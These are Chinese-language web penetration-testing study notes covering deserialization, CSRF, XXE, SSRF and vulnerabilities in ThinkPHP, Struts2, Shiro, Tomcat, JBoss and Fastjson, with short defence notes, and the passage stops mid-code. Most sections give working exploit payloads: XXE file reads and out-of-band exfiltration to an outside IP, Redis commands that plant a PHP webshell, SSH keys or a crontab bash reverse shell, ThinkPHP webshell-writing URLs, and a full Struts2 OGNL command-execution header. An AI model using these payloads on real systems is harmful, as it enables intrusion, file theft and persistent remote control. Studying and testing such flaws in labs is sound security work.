#  %a%的输出为whoami
%a:~0%		#取出a的值中的所有字符
%a:~0,6%	#取出a的值，从第0个位置开始，取6个值
```

##### d. 多命令执行语法

* **管道符 |** ：可以连接命令，且**只执行后面的命令**

  ```apl
  whoami | net user
  ```

* **双管道符||**：**只有**前面的命令**失败**，**才**执行后面的命令

  ```apl
  whoam || net user
  ```

* **&**：前面的命令**不影响**后面命令的执行

  ```apl
  whoami & net user
  ```

* **&&**：**前面的命令成功才**执行后面的命令

  ```apl
  whoami && net user
  ```

## 反序列化

### 1. 定义

* 序列化就是把**一个对象变成字符串的操作**，方便以特定的格式**在进程之间跨平台、安全的进行通信**；反序列化就是把**字符串转化为对象的操作**。PHP反序列化漏洞也叫**PHP对象注入**

### 2. 形成原因

* 程序**没有**对用户**输入的**反序列化字符串进行**检测**，导致反序列化过程可以被恶意控制

### 3. 危害

1. 代码、系统命令执行
2. getshell

### 4. 防御

1. **严格过滤用户输入**的unserialize函数的参数
2. 对unserialize后的**变量内容进行检查**，以确定内容没有被污染

### 5. 常见魔法函数

| 魔法函数       | 含义                                          |
| -------------- | --------------------------------------------- |
| __construrct() | 当**对象创建**时被调用                        |
| __destruct()   | 当**对象销毁**时被调用                        |
| __sleep()      | 在对象**被序列化**之前被调用                  |
| __wakeup()     | 在**unserialize()**函数执行**反序列化时**调用 |
| __toString()   | 当**对象被当做字符串**时使用                  |

### 6. 实例

* 需配合**其他漏洞**使用，例如代码执行、命令执行等

```php
//代码
<?php
class Test{			//创建一个类
	public $str='ichunqiu';
	function __destruct(){	//通过反序列化，调用A对象，因为PHP魔法函数的原因，会自动执行__destruct()
		@system($this->str);
	}
}
$test = new Test();		
//echo serialize($test);
echo "<pre>";
unserialize($_GET['code']);		//反序列化，将得到的序列化字符串反序列化为对象
?>
    
//payload
    ?code=O:4:"Test":1:{s:3:"str";s:8:"ipconfig";}
	?code=O:4:"Test":1:{s:3:"str";s:6:"whoami";}
```

## CSRF

### 1. 定义

* 全称跨站请求伪造，可以强制终端用户在当前对其进行身份验证后的Web应用程序**执行非本意的操作**

### 2. 原理

* CSRF是一种**欺骗**受害者提交恶意请求的攻击，他**继承了受害者的身份和权限**，代表受害者执行**非本意、恶意**的操作

![csrf原理图](http://113.45.142.235:9001/laffrex/pictures/csrf原理图.png)

### 3. 满足条件

> 1. 登陆**受信任网站**A，并在**本地生成Cookie**
>
> 2. 在**不登出A**的情况下，**访问危险网站**B

### 4. 防御

> 1. 验证Referer字段
>    * 如果Referer是**其他网站**，则有可能是CSRF攻击，考虑拒绝该请求
> 2. 添加Token验证
>    * 在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立拦截器来验证token，如果请求中**没有token或token不正确**，则可能是CSRF攻击
> 3. 二次验证
>    * 在转账等**关键操作**之前提供**当前的用户密码**或**验证码**
> 4. 用户养成良好习惯

****

### 5. 实例

#### (1). GET

1. 登录用户账号

   ![image-20241005234621153](http://113.45.142.235:9001/laffrex/pictures/2024/10/05/202410052346194.png)

2. 构造含有恶意代码的url

   * http://127.0.0.1/csrf/csrf_get.html

   ![image-20241005234757786](http://113.45.142.235:9001/laffrex/pictures/2024/10/05/202410052347828.png)

3. 欺骗用户点击

4. 成功修改

   ![image-20241005235206203](http://113.45.142.235:9001/laffrex/pictures/2024/10/05/202410052352243.png)

****

#### (2). POST

1. 登录用户账号

   ![image-20241005235339730](http://113.45.142.235:9001/laffrex/pictures/2024/10/05/202410052353761.png)

2. 构造含有恶意代码的链接

   * http://127.0.0.1/csrf/csrf_post.html

   ![image-20241005235420470](http://113.45.142.235:9001/laffrex/pictures/2024/10/05/202410052354508.png)

3. 欺骗用户点击链接

   ![image-20241005235452336](http://113.45.142.235:9001/laffrex/pictures/2024/10/05/202410052354361.png)

4. 成功更改

   ![image-20241005235511544](http://113.45.142.235:9001/laffrex/pictures/2024/10/05/202410052355581.png)

****

### 6. 与XSS区别

#### (1). 原理上

* XSS是将**恶意代码插入到html页面**中，当用户浏览页面时，插入的恶意代码被执行，从而达到目的
* CSRF是一种**欺骗受害者**提交恶意请求的攻击，代表受害者执行**非本意、恶意**的操作

#### (2). 其他角度

1. XSS针对**客户端**，CSRF针对**服务端**
2. XSS是**利用合法用户**获取信息，CSRF是**伪造成合法用户**发起请求
3. CSRF**危害性高**于XSS，且相比难以防御
4. XSS有局限性，CSRF没有局限性
5. XSS可以达到CSRF的效果，反之不行

****

### 7. 同源策略

#### (1). 定义

* 同源，即指相同**域名、端口、协议**

#### (2). 受约束对象

* 浏览器上的**DOM**、**Cookie**、第三方插件、**XMLHttpRequest**

#### (3). 不受约束对象

* **重定向、页面中的链接、表单提交**

****

### 8. 跨域问题

#### (1). 定义

* 不同源的脚本**不能操作其他源**下面的对象，因此**不同域之间**请求数据的操作，称为跨域

****

#### (2). 解决方法

##### a. document.domain跨域

###### ①概述

* 两个页面一级域名相同，**只是二级域名不同**，可以通过设置**document.domain**来共享Cookie

###### ②缺点

1. 只能在父域名与子域名之间使用
2. 存在安全问题，当一个站点被攻击后，另一个站点会引起安全漏洞
3. 只使用于**Cookie和iframe窗口**

```apl
网页A：http://a.baidu.com/index.html
网页B：http://b.baidu.com/index.html

将document.doamin属性设置为相同，例如document.domain=‘baidu.com’，就能实现两个页面之间的任意通信
```

****

##### b. JSONP跨域

###### ①说明

* 利用`<script>`的**src不受同源策略约束**来实现跨域获取数据
* **jsonp(JSON with Padding)**是json的一种“使用模式”，可以让网页从别的域名那获取资料，即跨域读取数据。

###### ②存在问题

1. **存在安全问题**，需要网站双方商议基础token的身份验证
2. **只能是GET**
3. 可能被注入恶意代码，篡改页面内容，可以采用字符串过滤来规避此问题

###### ③实例

****

##### c. CORS跨域

###### ①说明

1. CORS是一个W3C标准，允许浏览器向跨源服务器发送**XMLHttpRequest**请求
2. 利用**JavaScript无法控制HTTP头**的特点，通过目标返回的**HTTP头授权**是否允许跨域访问

##### d. CORS漏洞检测与利用

* CORS(Cross-Origin Resource Sharing)，跨域资源共享，是HTML5的一个新特性，不同于古老的jsonp只能get请求

###### ①检测方式

1. curl

   ```cmd
   curl https://www.baidu.com -H "Origin:https://qq.com" -I
   ```

2. burp抓包，查看返回包

   ```
   tips：Access-Control-Allow-Origin的值，
   值为Null，意味着信任任何区域
   ```

## XXE

### 1. 定义

* XXE，全称XML外部实体引入，应用程序在**解析XML输入**时，**没有过滤**XML文件内容或**禁止外部实体的加载**，导致可**加载恶意外部文件**

### 2. 产生原因

> 1. 对上传的xml文件没有过滤
> 2. 没有禁用外部实体的加载

### 3. 危害

> 1. 读取任意文件
> 2. 执行系统命令
> 3. 内网端口扫描
> 4. 攻击内网其他网站

### 4. 防御

> 1. **禁止使用外部实体**，例如`ibxml_disable_entity_loader(true)`
> 2. **过滤**用户提交的**XML数据**，防止出现非法内容

### 5. 漏洞利用

##### a. 本地引用任意文件

```xml-dtd
<!--读取Linux系统-->
#payload：
<?xml version="1.0"?>
<!DOCTYPE note[
    <!ENTITY content SYSTEM "file:///etc/passwd">
    ]>
&content;

<!--读取windows系统-->
#payload：
#读取Windows系统的配置文件
<?xml version="1.0"?>
<!DOCTYPE note[
<!ENTITY content SYSTEM "file:///c:/windows/win.ini">
]>
&content;
```

****

##### b. 远程引用任意文件

```dtd
<!--读取windows系统-->
#payload：
<?xml version="1.0"?>
<!DOCTYPE note[
<!ENTITY % test SYSTEM "http://192.168.71.49:80/1.dtd">
%test;
]>
&xxe;

<!--外部文件1.dtd内容-->
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php">
```

****

##### c. 远程端口探测

###### ①payload

```xml-dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note[
<!ENTITY  test SYSTEM "http://ip:探测端口号/test/">
]>

&xxe;
```

###### ②实例

```xml-dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note[
<!ENTITY  test SYSTEM "http://ip:192.168.71.59:80/test/">
]>

&test;
```

![远程端口探测](http://113.45.142.235:9001/laffrex/pictures/远程端口探测.png)

****

##### d. RCE

* **服务器配置不当/开发内部应用**导致
* php环境中安装了**expect扩展**

###### ①payload

```xml-dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note[
<!ENTITY  test SYSTEM "expect://系统命令">
]>
&test;
```

###### ②实例

### 6. 回显方式

#### (1). 有回显

##### a. 方式

> 1. 在xml内部DTD中，定义一个外部参数实体引入外部dtd，外部参数实体的值是外部dtd的url，
> 2. 在外部dtd文件中，定义一个外部普通实体实体，外部实体的值是payload
> 3. 在内部dtd中引用参数实体，在xml中引用外部dtd的外部实体 

```xml-dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note[
<!ENTITY  test SYSTEM "file:///etc/passwd">
]>
&test;
```

##### b. 用途

> 1. XXE的扩展利用
> 2. 内网探测机器开放端口
> 3. 进行内网探测

#### (2). 无回显

* 采用数据外带的方式

```xml-dtd
<!--1.dtd文件内容-->
<!ENTITY % x SYSTEM "php://filter/read-convert.base64-encode/resource=doLogin.php">
<!ENTITY % y "<!ENTITY &#37; z SYSTEM 'http://192.168.71.57/?data=%x'>">

<!--payload-->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE abc [<!ENTITY % a SYSTEM "http://192.168.71.57/xxe/2.dtd">
%a;%y;%z;
]>

%x;
```

### 7. XML基础

#### (1). 语法结构

* 分为2部分，一部分是**标签的定义**，一部分是**标签的解释**(DTD，Document Type Defination)

  ![XML语法结构](http://113.45.142.235:9001/laffrex/pictures/XML%E8%AF%AD%E6%B3%95%E7%BB%93%E6%9E%84.png)

#### (2). DTD文档

##### a. 概述

1. DTD使数据格式之间**按照相同的标准来传输**
2. DTD是一种XML**约束模式**语言，用来**解释XML文档**

##### b. 类型

* **内部**DTD文档和**外部**DTD文档

##### c. 语法结构

###### ①内部DTD

* ```dtd
  <!DOCTYPE 根元素[定义内容]>
  ```

  ![DTD内部文档语法结构](http://113.45.142.235:9001/laffrex/pictures/DTD内部文档语法结构.png)

###### ②外部DTD

* 使用**system**关键字

* ```dtd
  <!DOCTYPE 根元素 SYSTEM "DTD文件路径">
  ```

1. 新建一个DTD文档outdtd.dtd

   ```dtd
   <?xml version="1.0"?>
   <!ELEMENT note (to.from,heading,body)>
   <!ELEMENT to (#PCDATA)>
   <!ELEMENT from (#PCDATA)>
   <!ELEMENT head (#PCDATA)>
   <!ELEMENT body (#PCDATA)
   ```

2. 新建一个XML文档outdtd.xml

   ```xml
   <?xml version="1.0"?>
   <! DOCTYPE note SYSTEM "outdtd.dtd">
   <note>
       <to>ichunqiu</to>
       <from>Hello</from>
       <head>safe</head>
       <body>666</body>
   </note>
   ```

###### ③内外结合

* ```dtd
  <!DOCTYPE 根元素 SYSTEM "DTD文件路径" [定义内容]>
  ```

1. 新建一个DTD文档outdtd.dtd

   ```dtd
   <?xml version="1.0" encodeing="UTF-8"?>
   <!ELEMENT from (#PCDATA)>
   <!ELEMENT head (#PCDATA)>
   <!ELEMENT body (#PCDATA)
   ```

2. 新建一个XML文档outdtd.xml

   ```xml
   <?xml version="1.0"?>
   <! DOCTYPE note SYSTEM "outdtd.dtd">[
   <!ELEMENT note (to,from,heading,body)>
   <!ELEMENT to (#PCDATA)>
   ]
   <note>
       <to>ichunqiu</to>
       <from>Hello</from>
       <head>safe</head>
       <body>666</body>
   </note>
   ```

#### (3). XML实体

##### a. 概述

* XML实体，即XML语言的变量，有实体名(变量名)和实体值(变量值)，可以通过`&` `%` `/`引用

##### b.实体类型

* **普通**实体和**参数**实体

  ![XML实体类型解析](http://113.45.142.235:9001/laffrex/pictures/XML实体类型解析.png)

##### c. 支持的协议

<img src="http://113.45.142.235:9001/laffrex/pictures/XML支持协议.png" alt="XML支持协议" style="zoom:40%;" />

##### d. XML实体引用

## SSRF

### 1. 定义

* SSRF(Server-side Request Forgery，服务端请求伪造)是一种由**攻击者**构造形成**由服务端发起请求**的安全漏洞，一般情况下，SSRF攻击的**目标是从外网无法访问的内网系统**。正是由于它是**由服务端发起**的，所以他能够请求到**与他相连而与外网隔离**的内部系统

### 2. 危害

> 1. 端口扫描
> 2. 内网Web应用指纹识别
> 3. 攻击内网Web应用
> 4. 读取本地文件

### 3. 防御

> 1. 限制请求的**端口只能为Web端口**，只允许访问HTTP和HTTPS的请求
> 2. 设置**白名单**，或**限制内网IP**，以防止对内网进行攻击
> 3. 禁止**30x跳转**
> 4. 屏蔽返回的详细信息

### 4. 相关函数

* 涉及到**网络访问**，**支持伪协议的网络读取**的函数

> 1. file_get_content()
>    * 把文件**写入字符串**，若为内网url的文件，**会先读出来再写入**
> 2. curl_exec()
>    * 常通过**file**、**dict**、**gopher**协议来渗透
> 3. fsockopen()
>    * 打开一个**网络连接**或**Unix套接字连接**

![curl_exec](http://113.45.142.235:9001/laffrex/pictures/curl_exec()%E6%B6%89%E5%8F%8A%E5%8D%8F%E8%AE%AE.png)

****

### 5. 漏洞利用

#### (1). 端口扫描

* 当设置参数URL为内网地址时，会**泄露内网信息**，比如内网的某个服务是否开放

  ```html
  ?url=ip:port
      <!--开放端口-->
      	返回服务信息，或是403报错
      <!--未开放端口-->
      	返回404
  ```

![端口未开放](http://113.45.142.235:9001/laffrex/pictures/端口未开放.png)

![端口已开放](http://113.45.142.235:9001/laffrex/pictures/端口已开放.png)

****

#### (2). 获取正常文件

```
http://192.168.71.15/ssrf3.php?url=http://www.baidu.com/robots.txt
```

![读取正常文件](http://113.45.142.235:9001/laffrex/pictures/读取正常文件.png)

****

#### (3). 读取系统本地文件

* 利用**file协议**可以**任意读取**系统本地文件

  ![读取系统本地文件](http://113.45.142.235:9001/laffrex/pictures/%E8%AF%BB%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6.png)

#### (4). 内网Web应用指纹识别

* 大多数Web应用框架都有一些**独特的文件和目录**，通过这些文件可以**识别出应用的类型**，甚至**详细的版本**，进而作出进一步针对攻击

```cmd
#探测是否安装了phpmyadmin
http://192.168.71.15/ssrf3.php?url=http://localhost/phpmyadmin/README
```

#### (5). 端口探测

> * 由于XXE漏洞可以利用**http协议**，故**利用该http请求去探查内网**，进行SSRF攻击
> * 可以根据响应时间/长度判断端口是否开放

****

### 6. Redis+gopher

#### (2). Redis条件

> 1. **未授权访问**，在访问redis数据库时，**不需要提供用户名和密码**，或**弱口令**
> 2. 具有root权限
> 3. 可以读写文件
> 4. 默认端口号为：**6379**

****

#### (3)方法

##### a. 绝对路径写Webshell

###### ①前提

* 需要知道Web的绝对路径

###### ②构造payload

1. redis命令

   ```
   flushall
   set 1 '<?php eval($_GET["cmd"]); ?>'
   config set dir /var/www/html
   config set dbfilename shell.php
   save
   ```

****

##### b. 写SSH公钥

###### ①前提

* 目标机开启SSH服务

###### ②说明

* 如果.ssh目录存在，则直接写入~/.ssh/authorized_keys，如果不存在，则利用crontab创建该目录

###### ③方法

* 本地生成RSA公钥私钥对，将公钥通过redis写入~/.ssh/authorized_keys，实现SSH免密登录

##### ④构造payload

1. redis命令

   ```
   flushall
   set 1 '生成的RSA公钥私钥对'
   config set dir /root/.ssh/
   config set dbfilename authorized_keys
   save
   ```

****

##### c. 写crontab计划任务反弹shell

###### ①前提

* **Centos系统**

* crontab定时文件位置

  | 目录                          | 说明                                                         |
  | ----------------------------- | ------------------------------------------------------------ |
  | /etc/crontab                  | 一定存在的文件                                               |
  | /etc/cron.d/*                 | 将任意文件写入到该目录下，效果和crontab相同，利用这个目录可以做到不覆盖任何其他文件的情况下进行反弹shell |
  | /var/spool/cron/root          | centos系统下root用户的cron文件                               |
  | /var/spool/cron/crontabs/root | debian系统下root用户的cron文件                               |

###### ②payload

```bash
flushall
set 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/[反弹机IP]/[port] 0>&1\n\n'
config set dir /var/spool/cron
config set dbfilename root
save
```

##### d. 主从复制RCE

****

### 7. 绕过

#### (1). 限制域名

> 1. 采用http基本身份认证的绕过方式，即使用@绕过，如：http://www.aaa.com@www.bbb.com@www.ccc.com
>
> 2. 在对@的解析域名中，**不同的处理函数**存在**处理差异**，如：PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com

#### (2). 限制请求ip

> 1. 短网址绕过
> 2. 特殊域名
>    * xip.io可以指向任意域名，即``127.0.0.1.xip.io =>  127.0.0.1`
> 3. 进制转换
>    * `127.0.0.1 => 0x7f.0.0.1`

#### (3). 限制请求为http

> 1. 采取302跳转，使用302跳转地址
> 2. 采取短地址

## 中间件与组件漏洞

### 1. ThinkPHP

#### (1). 漏洞总结

##### a. 识别

> 1. ico图标判断
> 2. 报错页面信息
> 3. 错误传参报错
>    * 特殊指纹出现logo(p3.1、p3.2版本)
> 4. body特征
>    * body里面有"**十年磨一剑**"或者"**ThinkPHP**"
> 5. wappalyzer插件

#### (2). 漏洞利用

##### a. 5.0.20RCE漏洞

###### ①漏洞产生

* 版本5中，没有正确处理控制器名，导致在网站**没有开启强制路由**的情况(默认情况)下可以**执行任意方法**，从而导致RCE漏洞

###### ②影响版本

> * 5.0.x < ThinkPHP < 5.0.23
> * 5.1.x < ThinkPHP < 5.1.31

###### ③手动验证

1. 验证漏洞

   ```apl
   ?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
   ```

   ![ThinkPHPRCE验证漏洞](http://113.45.142.235:9001/laffrex/pictures/ThinkPHPRCE%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E.png)

2. 执行系统命令

   ```apl
   ?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
   ```

   ![ThinkPHPRCE执行命令](http://113.45.142.235:9001/laffrex/pictures/ThinkPHPRCE%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.png)

3. 写入webshell

   ```apl
   ?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php @assert($_REQUEST['cmd']);?>
   ```

   ![ThinkPHPRCE写入phoinfo](http://113.45.142.235:9001/laffrex/pictures/ThinkPHPRCE%E5%86%99%E5%85%A5phoinfo.png)

4. 验证webshell

```php
shell.php?cmd=phpinfo();
```

![ThinkPHPRCE验证phpinfo](http://113.45.142.235:9001/laffrex/pictures/ThinkPHPRCE验证phpinfo.png)

###### ④工具验证

****

##### b. 6.0.12文件包含漏洞

###### ①漏洞产生

* ThinkPHP**开启多语言功能**时，攻击者可以通过**lang参数**和**目录穿越**实现文件包含，当存在**其它扩展模块，如pear扩展**时，攻击者可以进一步利用文件包含实现RCE
* 被包含文件**后缀名一定是php**

###### ②影响版本

* 6.0.1 <= ThinkPHP <= 6.0.16

###### ③手动验证

* 漏洞环境中，pearcmd的路径在：/usr/local/lib/php/pearcmd.php

1. 写文件

   ```apl
   #写在临时路径
   	?lang=../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&<?=phpinfo()?>+/tmp/shell.php
   #写在web根目录绝对路径
        ?lang=../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&<?=phpinfo()?>+/var/www/html/shell.php
   ```

   ![ThinkPHP文件包含写文件](http://113.45.142.235:9001/laffrex/pictures/ThinkPHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%86%99%E6%96%87%E4%BB%B6.png)

2. 包含文件

   ```apl
   ?lang=../../../../../../../../../../tmp/shell
   ```

   ![ThinkPHP文件包含读文件](http://113.45.142.235:9001/laffrex/pictures/ThinkPHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%AF%BB%E6%96%87%E4%BB%B6.png)

3. 写webshell

   ```apl
   ?lang=../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&<?=@eval($_REQUEST['cmd']);?>+/tmp/cmd.php
   ```

   ![ThinkPHP文件包含写Webshell](http://113.45.142.235:9001/laffrex/pictures/ThinkPHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%86%99Webshell.png)

4. 包含webshell

   ```apl
   ?lang=../../../../../../../../../../tmp/cmd&cmd=phpinfo();
   ```

   ![ThinkPHP文件包含包含Webshell](http://113.45.142.235:9001/laffrex/pictures/ThinkPHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8C%85%E5%90%ABWebshell.png)

5. 连接webshell

![ThinkPHP文件包含连接Webshell](http://113.45.142.235:9001/laffrex/pictures/ThinkPHP文件包含连接Webshell.png)

****

### 2. Laravel

#### (1). 漏洞原理

* 开启了**Debug模式**，由于Laravel自带的**Ignition组件**对**file_get_contents()和file_put_contents()**函数的不安全使用，攻击者可以通过发起恶意请求，构造**恶意Log文件**等方式**触发Phar反序列化**，最终造成RCE

#### (2). 影响版本

* Laravel <= 8.4.2

#### (3). 漏洞利用

* 通过phar://协议进行反序列化操作

* 使用工具`CVE-2021-3129`

![laravel漏洞](http://113.45.142.235:9001/laffrex/pictures/laravel漏洞.png)

****

### 3. Struts2

#### (1). S2-045漏洞原理

* 在使用**基于Jakarta插件的文件上传**功能时，有可能存在**远程命令执行**，用户可在**上传文件时**修改HTTP请求头中的**Content-Type值**，利用**ONGL表达式**来触发该漏洞，进而执行系统命令

#### (2). 影响版本

> * Struts2.3.5 - 2.3.31
> * Struts2.5 - 2.5.10

#### (3). 漏洞复现

##### a. 手工

1. 随意上传文件，抓取数据包

2. 修改content-type字段

   ```apl
   Content-Type:"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"boundary=----WebKitFormBoundaryXx80aU0pu6vrsV3z
   ```

3. 在Content-Type字段中修改命令

4. 成功执行`whoami`

##### b. 工具测试

1. 使用工具检测漏洞

   ![Struts2漏洞](http://113.45.142.235:9001/laffrex/pictures/Struts2漏洞.png)

2. 选择漏洞，执行命令

   ![Struts2漏洞2](http://113.45.142.235:9001/laffrex/pictures/Struts2漏洞2.png)

#### (4). 判断Struts2框架

##### a. 常规办法

1. 通过页面回显的错误消息来判断
2. 通过网页`action`**后缀**来判断，有可能不准
3. 判断**/struts/webconsole.html**是否存在进行判断，需要devMode = True

##### b. 其他办法

1. 通过actionErrors，要求是对应的Action需要继承来自ActionSupport类

   * http://www.target.com/?actionErrors=1111

   | 可能情况                                                 |
   | -------------------------------------------------------- |
   | 页面直接出现404 or 500等错误                             |
   | 页面输出了与业务有关的错误消息，或者1111被回显到了页面上 |
   | 页面的内容结构发生了明显的改变                           |
   | 页面发生了重定向                                         |

****

### 4. Shiro

#### (1). Shiro550反序列化

##### a. 原理

* Apache Shiro框架提供了**记住密码的功能**(RememberMe)，用户登录成功后会生成经过**加密**并**编码的cookie**。在服务端对rememberMe的cookie值，先base64解码，再AES解密，最后在反序列化，这就导致了反序列化RCE漏洞

* payload：
  * 命令 => 序列化 => AES加密 => base64编码 => RememberMe Cookie值

##### b. 影响版本

* Apache Shiro < 1.2.4(该版本往前使用**默认AES秘钥**)

##### c. 漏洞复现

* 使用工具

* 1. 访问漏洞url，登录并抓包

     ![Shiro550-1](http://113.45.142.235:9001/laffrex/pictures/Shiro550-1.png)

  2. 获取key，通过工具爆破

     ![Shiro550-2](http://113.45.142.235:9001/laffrex/pictures/Shiro550-2.png)

  3. 获取到利用链

     ![Shiro550-3](http://113.45.142.235:9001/laffrex/pictures/Shiro550-3.png)

  4. 执行命令

     ![shiro550-4](http://113.45.142.235:9001/laffrex/pictures/shiro550-4.png)

  5. getshell

     ![Shiro550-5](http://113.45.142.235:9001/laffrex/pictures/Shiro550-5.png)

     ![Shiro550-6](http://113.45.142.235:9001/laffrex/pictures/Shiro550-6.png)

##### d. 判断Shiro框架

* 返回包中会包含`RememberMe=deleteMe`字段，这种情况大多发生在登录处；如果没有该字段，可以在数据包中的Cookie中添加`rememberMe=deleteMe`字段

****

#### (2). Shiro721反序列化

##### a. 原理

* 由于Apache Shiro **cookie**中通过**AES-128-CBC模式加密**的**rememberMe字段**存在问题，用户可通过**Padding Oracle Attack**来构造**恶意的**rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。

##### b. 前提

* 进行攻击前需要**获取一个合法用户的Cookie**

##### c. 流程

> 1. 登录网站获取合法Cookie
> 2. 使用rememberMe字段进行Padding Oracle Attack，获取intermediary
> 3. 利用intermediary构造出恶意的反序列化密文作为Cookie
> 4. 使用新的Cookie请求网站执行攻击

##### d. 影响版本

* **Apache Shiro <= 1.4.1**

****

#### (3). 两者差异

1. 相同点
   * 都是生成恶意RememberMe Cookie反序列化执行代码
2. 不同点
   * Shiro550序列化利用**需要知道AES加密的key**，使用这个key直接构造Payload
   * Shiro721序列化是利用**已登录用户的合法RememberMe Cookie值**，通过服务器对填充秘钥的不同响应，从而判断加密值是否被正确填充，构造Payload

****

### 5. Tomcat

#### (1)任意文件写入漏洞

* **CEV-2017-12615**

##### a. 原理

* 当Tomcat启用了PUT方法(readonly初始化参数由默认值设置为false)，攻击者将有可能通过精心构造的攻击请求数据包上传包含任意代码的JSP文件，JSP文件中的恶意代码将能够被服务器执行，导致服务器上的数据泄露或获取服务器权限

##### b. 漏洞检测

* 通过访问：http://localhost:8080，抓包后发起PUT请求，响应包若为201，即可确认该漏洞

##### c. 漏洞复现

1. 直接利用PUT方法写webshell
2. 访问文件连接webshell

****

#### (2)任意文件读取漏洞

* **CVE-2020-1938(GhostCat)**

##### a. 原理

* 由于Tomcat在**处理AJP请求**时，**未对请求做任何验证**，攻击者可以通过Tomcat AJP Connector读取或包含Tomcat上所有webapp目录下的任意文件，导致产生任意文件读取漏洞

##### b. 漏洞检测

* 通过**工具扫描开放8009端口**即存在CVE-2020-1938幽灵猫漏洞

****

#### (3)远程部署漏洞

##### a. 原理

* 这是JSP/PHP网站远程部署的一个工具，管理员只需要远程上传一个**WAR格式的文件**，便可以发布到网站，导致**远程部署恶意文件**

##### b. 检测

* 通过访问http://loaclhost:8080/manager管理地址，尝试弱口令或默认口令，若能登录成功，则存在该漏洞

****

##### c. 漏洞复现

1. 本地准备jsp的webshell，通过弱口令进入后台

   ![Tomcat远程部署1](http://113.45.142.235:9001/laffrex/pictures/Tomcat远程部署1.png)

2. 利用压缩软件或jar压缩成war后缀

   ```
   jar -cvf shell.war shell.jsp
   ```

3. 上传war包部署到服务器

   ![Tomcat远程部署2上传war包](http://113.45.142.235:9001/laffrex/pictures/Tomcat远程部署2上传war包.png)

4. 访问webshell成功getshell

   ![Tomcat远程部署3](http://113.45.142.235:9001/laffrex/pictures/Tomcat%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B23.png)

![Tomcat远程部署4](http://113.45.142.235:9001/laffrex/pictures/Tomcat远程部署4.png)

### 6. JBoss

#### (1). 5.x/6.x反序列化漏洞

* CVE-2017-12149

##### a. 原理

* 该漏洞为**Java反序列化错误类型**，存在于JBoss的**HttpInvoker组件中的ReadOnlyAccessFilter过滤器中**，该过滤器没有进行**任何安全检查**的情况下，尝试将来自客户端的数据流进行反序列化，从而导致了漏洞

****

#### (2). 远程部署漏洞

##### a. 原理

* 这是JSP/PHP网站远程部署的一个工具，管理员只需要远程上传一个**WAR格式的文件**，便可以发布到网站，导致**远程部署恶意文件**

##### b. 漏洞检测

* 使用工具 

****

##### c. 漏洞复现

1. 访问JBoss首页，http://localhost:8080/，并通过弱密码进入后台(admin/vulhub)

   ![JBOOS1](http://113.45.142.235:9001/laffrex/pictures/JBOOS1.png)

2. 上传war包部署到服务器

   <img src="http://113.45.142.235:9001/laffrex/pictures/Jboss2.png" alt="Jboss2" style="zoom:100%;" />

3. 访问webshell成功getshell

   ![JBoos3](http://113.45.142.235:9001/laffrex/pictures/JBoos3.png)

![Jboss4](http://113.45.142.235:9001/laffrex/pictures/Jboss4.png)

****

### 7. WebLogic

#### (1)基本信息

1. 常用端口：**7001**
2. 后台登录地址：http://localhost:7001/console

****

#### (2)控制台部署漏洞

* 默认密码：weblogic/Oracle@123

##### a. 漏洞复现

****

#### (3)RCE漏洞

* CVE-2023-21839

##### a. 原理

* 可在**未经身份验证**的情况下，通过**T3、IIOP协议远程访问**并破坏易受攻击的WebLogic Server，陈工利用该漏洞则可能导致未授权访问和敏感信息泄露

##### b. 漏洞复现

****

### 8. Fastjson反序列化

#### (1). 原理

* 由于引进了AutoType功能，fastjson在对json字符串反序列化的时候，会读取到@type的内容，将json内容反序列化为java对象并调用这个类的setter方法

#### (2). 利用流程

1. 开启HTTP服务器，并将恶意类放在目录下
2. 开启恶意RMI服务器
3. 攻击者控制url参数为上一步开启的恶意RMI服务器地址
4. 恶意RMI服务器返回ReferenceWrapper类
5. 目标(JNDI_Client)执行lookup操作的时候，

#### (3). 限制条件

##### a. RMI

> * jdk< 6u132、7u131、8u121

##### b. LADP

> * jdk < 11.0.1、8u191、7u201、6u211
> * 8u191中，关闭了JNDI远程类加载

****

#### (5). 漏洞复现

1. 拉取docker并成功部署

2. 编写恶意类并编译

   ```java
   // javac TouchFile.java
   import java.lang.Runtime;
